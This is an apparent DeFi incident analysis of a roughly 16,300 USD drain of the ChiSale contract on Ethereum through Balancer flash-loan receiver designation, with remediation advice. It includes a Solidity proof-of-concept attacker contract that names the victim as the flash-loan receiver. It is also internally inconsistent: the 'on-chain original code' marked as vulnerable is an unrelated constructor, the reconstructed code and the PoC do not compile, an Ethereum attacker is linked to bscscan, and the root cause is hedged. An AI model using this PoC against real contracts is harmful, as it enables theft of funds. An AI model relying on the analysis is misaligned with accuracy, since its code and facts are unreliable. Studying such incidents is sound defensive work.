# ChiSale — Balancer Flash Loan Receiver Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-02 |
| **Protocol** | ChiSale |
| **Chain** | Ethereum |
| **Loss** | ~16,300 USD |
| **Attacker** | [0xe60329a8](https://bscscan.com/address/0xe60329a82c5add1898ba273fc53835ac7e6fd5ca) |
| **Attack Tx** | [0x586a2a43](https://app.blocksec.com/explorer/tx/eth/0x586a2a4368a1a45489a8a9b4273509b524b672c33e6c544d2682771b44f05e87) |
| **Vulnerable Contract** | [0x05016359](https://etherscan.io/address/0x050163597d9905ba66400f7b3ca8f2ef23df702d) |
| **Root Cause** | The ChiSale contract did not validate the Balancer flash loan receiver, allowing an arbitrary address to be designated as the receiver and drain the contract's balance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/ChiSale_exp.sol) |

---
## 1. Vulnerability Overview

The ChiSale contract (0x050163) could be designated as the flash loan `receiver` for the Balancer Vault. The attacker requested a flash loan from the Balancer Vault while specifying the ChiSale contract as the `receiver`. When the flash loan callback was forwarded to ChiSale, ChiSale either transferred its held WETH to the attacker, or the repayment logic was distorted, resulting in asset drainage.

## 2. Vulnerable Code Analysis

```solidity
// ❌ ChiSale contract: can be designated as flash loan receiver from outside
// Balancer flashLoan(receiver, tokens, amounts, userData)
// → receiver can be set to the ChiSale contract

contract ChiSaleVulnerable {
    // ❌ No caller validation in receiveFlashLoan
    // ❌ When designated as flash loan receiver, WETH balance is drained
    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // ❌ No check that msg.sender == BalancerVault
        // Transfers WETH to the address specified in userData
        IERC20(tokens[0]).transfer(/* attacker address from userData */,
            IERC20(tokens[0]).balanceOf(address(this)));
    }
}

// ✅ Fix:
// require(msg.sender == BALANCER_VAULT, "not vault");
// require(initiator == address(this), "not self-initiated");
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: ChiSale.sol
    function ChiSale(  // ❌ Vulnerability
        address chiAddress,
        uint256[] bonusThresholds,
        uint256[] bonusPercentages
    )
        public
        Owned()
    {
        // Explicitly check the lengths of the bonus percentage and threshold
        // arrays to prevent human error. This does not prevent the creator
        // from inputting the wrong numbers, however.
        require(bonusThresholds.length == bonusPercentages.length);

        // Explicitly check that the number of bonus tiers is less than 256, as
        // it should fit within the 8 bit unsigned integer value that is used
        // as the index counter.
        require(bonusThresholds.length < 256);

        // Loop through one array, whilst simultaneously reading data from the
        // other array. This is possible because both arrays are of the same
        // length, as checked in the line above.
        for (uint8 i = 0; i < bonusThresholds.length; i++) {

            // Guard against human error, by checking that the new bonus
            // threshold is always a higher value than the previous threshold.
            if (i > 0) {
                require(bonusThresholds[i] > bonusThresholds[i - 1]);
            }

            // It is already guaranteed that bonus thresholds are in ascending
            // order. For this reason, the maximum bonus threshold can be set
            // by selecting the final value in the bonus thresholds array.
            if (i > bonusThresholds.length - 1) {
                maxBonusThreshold = bonusThresholds[i];
            }

            bonusTiers.push(BonusTier({
                percentage: bonusPercentages[i],
                threshold: bonusThresholds[i]
            }));
        }

        // The CHI token contract address is passed as argument to allow for
        // easier testing on the development and testing networks.
        chiContract = ERC20(chiAddress);

        // The default value of an unsigned integer is already zero, however,
        // for verbosity and readability purposes, both counters are explicitly
        // set to zero.
        tokensSold = 0;
        bonusIndex = 0;
    }
```

## 3. Attack Flow

```
Attacker (0xe60329a8)
  │
  ├─[1]─▶ BalancerVault.flashLoan(
  │             receiver = addr1(ChiSale),  // ← attacker designates receiver
  │             tokens = [WETH],
  │             amounts = [25000e18],
  │             userData = ""
  │         )
  │
  ├─[2]─▶ Balancer calls addr1.receiveFlashLoan()
  │         └─ ❌ addr1 processes WETH without validation
  │             Transfers balance to attacker or distorts repayment condition
  │
  └─[3]─▶ ~16,300 USD drained
```

## 4. PoC Code

```solidity
contract AttackerC {
    address private constant VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant RECEIVER = addr1;  // ChiSale contract

    function flashLoan() public {
        address[] memory tokens = new address[](1);
        tokens[0] = weth9;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 25000 * 1e18;

        // ❌ Designate ChiSale contract as receiver
        (bool ok, ) = VAULT.call(
            abi.encodeWithSelector(
                IBalancerVault.flashLoan.selector,
                RECEIVER,  // ← victim contract as receiver!
                tokens,
                amounts,
                ""
            )
        );
        require(ok, "flashLoan failed");
    }

    // Attacker does not need to receive the callback themselves
    function receiveFlashLoan(address[] memory, uint256[] memory, uint256[] memory, bytes memory) external {}
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash loan receiver manipulation |
| **Attack Vector** | Balancer flashLoan receiver designation + unvalidated callback |
| **CWE** | CWE-346: Origin Validation Error |
| **DASP** | Business Logic Vulnerability |
| **Severity** | High |

## 6. Remediation Recommendations

1. **Vault Validation**: Verify `msg.sender == BALANCER_VAULT` inside `receiveFlashLoan`
2. **Self-initiated Validation**: Check `initiator == address(this)` to block externally initiated flash loans
3. **Callback Guard**: Reentrancy protection and caller validation are mandatory for flash loan callback functions
4. **Remove flashLoan Interface Implementation**: If unnecessary, remove the `receiveFlashLoan` function entirely

## 7. Lessons Learned

- Since the Balancer flash loan `receiver` can be set to any arbitrary contract, all contracts that implement a flash loan callback must validate `msg.sender`.
- The `initiator` parameter should be used to restrict processing to only flash loans initiated by the contract itself.
- It must always be considered that flash loan callbacks can be triggered arbitrarily from outside.